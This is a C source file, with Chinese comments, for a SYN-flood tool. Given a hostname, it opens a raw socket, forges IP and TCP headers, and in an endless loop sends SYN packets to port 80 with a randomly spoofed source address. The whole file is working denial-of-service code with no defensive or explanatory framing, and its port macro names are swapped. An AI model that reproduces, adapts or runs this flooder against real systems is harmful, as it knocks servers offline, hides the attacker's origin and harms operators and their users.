/**
 * cloud@txthinking.com
 */

#include "sys/socket.h"
#include "netinet/in.h"
#include "netinet/ip.h"
#include "netinet/tcp.h"
#include "stdlib.h"
#include "errno.h"
#include "unistd.h"
#include "stdio.h"
#include "netdb.h" 

#define SRCPORT 80
#define DSTPORT 5183

struct prseuheader
{
unsigned long s_addr;
unsigned long d_addr;
unsigned char zero;
unsigned char prototp;
unsigned short len;
};

void send_tcp(int sockfd, struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr, int len); 

int main(int argc, char **argv)
{
int sockfd;
struct sockaddr_in addr;
struct hostent *host;
int on = 1;

if (argc != 2) {
fprintf(stderr, "Usage:%s hostname\n\a", argv[0]);
exit(1);
}
bzero(&addr, sizeof(struct sockaddr_in));

addr.sin_family = AF_INET;
addr.sin_port = htons(SRCPORT); 

if (inet_aton(argv[1], &addr.sin_addr) == 0) {
host = gethostbyname(argv[1]);
if (host == NULL) {
fprintf(stderr, "HostName Error:%s\n\a", hstrerror(h_errno));
exit(1);
}
addr.sin_addr = *(struct in_addr *) (host->h_addr_list[0]);
} 

//创建一个TCP的原始套接字
sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
if (sockfd < 0) {
fprintf(stderr, "Socket Error:%s\n\a", strerror(errno));
exit(1);
} 

//设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写
setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

//只用超级护用户才可以使用原始套接字
setuid(getpid());

send_tcp(sockfd, &addr);

return 0;
} 

void send_tcp(int sockfd, struct sockaddr_in *addr)
{
while (1)
{
char buffer[100];
char tcpbuff[32];
struct ip *ip;
struct tcphdr *tcp;
struct prseuheader theheader;
int head_len;

head_len = sizeof(struct ip) + sizeof(struct tcphdr);
memset((void*)buffer,'\0',100) ;

//填充IP数据包头
ip = (struct ip *) buffer;
ip->ip_v = IPVERSION;
ip->ip_hl = sizeof(struct ip) >> 2;
ip->ip_tos = 0;
ip->ip_len = htons(head_len);
ip->ip_id = 0;
ip->ip_off = 0;
ip->ip_ttl = MAXTTL;
ip->ip_p = IPPROTO_TCP;
//校验和让系统去做
ip->ip_sum = 0;
ip->ip_dst = addr->sin_addr; 

//开始填写TCP数据包
tcp = (struct tcphdr *) (buffer + sizeof(struct ip));
tcp->source = htons(DSTPORT);
tcp->dest = addr->sin_port;
tcp->ack_seq = 0;
tcp->doff = 5;
//syn置位
tcp->syn = 1;
tcp->check = 0;
tcp->seq = random();
//随机生成源地址
ip->ip_src.s_addr = random();

//填充伪头部
theheader.s_addr = ip->ip_src.s_addr;
theheader.d_addr = ip->ip_dst.s_addr;
theheader.zero = 0;
theheader.prototp = IPPROTO_TCP;
theheader.len = htons(20);

memset((void*)tcpbuff,'\0',32);

memcpy(tcpbuff,&theheader,12);
memcpy(tcpbuff+12,tcp,20);

//注意：tcp的校验和必须计算伪头部
tcp->check = check_sum((unsigned short *) tcpbuff, 32);

sendto(sockfd, buffer, head_len, 0, addr, sizeof(struct sockaddr_in));
usleep(1);
}
}

unsigned short check_sum(unsigned short *buffer, int size)
{
unsigned long cksum = 0;

while(size>1)
{
cksum += *buffer++;
size -= sizeof(unsigned short);
}

if(size)
{
cksum += *(unsigned char*)buffer;
}

cksum = (cksum>>16) + (cksum&0xffff); //将高16bit与低16bit相加
cksum += (cksum>>16); //将进位到高位的16bit与低16bit 再相加

return (unsigned short)(~cksum);
}

